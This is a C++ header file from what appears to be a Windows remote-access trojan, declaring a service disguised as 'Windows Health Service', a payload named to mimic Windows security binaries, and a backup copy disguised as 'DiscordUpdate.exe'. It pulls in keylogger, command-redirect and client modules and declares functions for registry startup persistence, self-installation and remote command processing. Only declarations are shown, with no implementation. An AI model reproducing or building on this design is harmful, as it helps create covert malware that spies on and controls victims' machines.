#pragma once

#ifndef GENERAL_H
#define GENERAL_H
#define WIN32_LEAN_AND_MEAN		//if left out order of windows.h and winsock.h plays messes up everything (just leave it in)

#define SERVICE_NAME "WindowsHealthService"
#define SERVICE_DISPLAY_NAME "Windows Health Service"
#define SERVICE_FILE_NAME "SecurityHealthServiceManager.exe"
#define SERVICE_ARCHIVE_NAME "external.zip"

#define SHELL_NAME "SecurityHealthService32.exe"

#define JOIN(x, y) x ## y
#define SHELL_PATH(x) JOIN("C:\\Windows\\ServiceProfiles\\LocalService\\", x)
#define SHELL_EXE SHELL_PATH(SHELL_NAME)
#define SHELL_BACKUP_PATH(x) JOIN("C:\\Windows\\ServiceProfiles\\NetworkService\\Downloads\\", x)
#define SHELL_BACKUP_NAME "DiscordUpdate.exe"
#define SHELL_BACKUP_EXE SHELL_BACKUP_PATH(SHELL_BACKUP_NAME)

#include <Windows.h>		
#include <string>
#include <tchar.h>
#include <stdio.h>
#include <time.h>
#include <fstream>
#include <thread>
#include <process.h>

#include "cmdRedirect.h"
#include "settings.h"
#include "conversion.h"
#include "utility.h"
#include "keylogger.h"
#include "client.h"

class General
{
public:		//some variables
	static std::string currentPath;			//current path of executable
	static std::string installFolder;		//path of folder it should be installed to
	static std::string installPath;			//full path where executable should be installed to
	static bool installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,
									//instead of proceeding to the main loop)
	static LPTSTR lpArguments;
public:
	static bool init();		//main init function

	static bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName);	//checks if a certain value exists in the registry
	static bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);	//registers a program in startup with supplied name, path to exe and startup arguments
	static bool directoryExists(const char* dirName);							//checks if directory exists

	static std::string getInstallFolder();											//gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
	static std::string getInstallPath(std::string instFolder);						//gets installpath (environment folder + folder name (if supplied) + file name)
	static std::string getCurrentPath();	//gets current path of executable

	static bool locationSet();	//checks if executable is located in install position
	static bool startupSet();	//checks if executable is starting on boot
	static bool installed();	//checks if executable is installed properly (location + startup)

	static std::string currentDateTime();

public:		//functions
	static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);		//starts a process
	static void handleError(int errType, bool errSevere);							//handles errors
	static std::string processCommand(std::string command);		//processes command
	static void restartSelf();		//restarts client
	static void killSelf();			//kills client
	static void log(std::string message);	//logs message / error / etc
	static void setLocation();		//sets location(copies file)
	static void runInstalled();		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client

private:	//functions
	static bool processParameter(std::string &command, std::string compCommand);
};

#endif